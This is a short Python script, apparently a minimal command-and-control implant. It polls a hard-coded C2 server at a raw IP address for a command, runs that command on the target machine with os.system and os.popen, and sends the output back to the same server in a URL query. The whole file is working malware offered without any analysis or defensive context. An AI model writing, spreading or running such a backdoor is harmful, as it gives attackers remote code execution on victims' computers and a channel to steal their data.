import urllib.request
import urllib
import os
import time
import random

#Comms
c2 = 'http://18.190.26.6:443'

# Command execution
time.sleep(2)
url = c2 + '/retrcommand'
response = urllib.request.urlopen(url)
command = response.read().decode("utf-8") 
os.system(command) #runs the command from our C2 server on the target 
commanddata = os.popen(command)
commanddatatext = urllib.parse.quote_plus(commanddata.read())

#Send command output to C2
urllib.request.urlopen(c2 + '/info?info=' + commanddatatext)
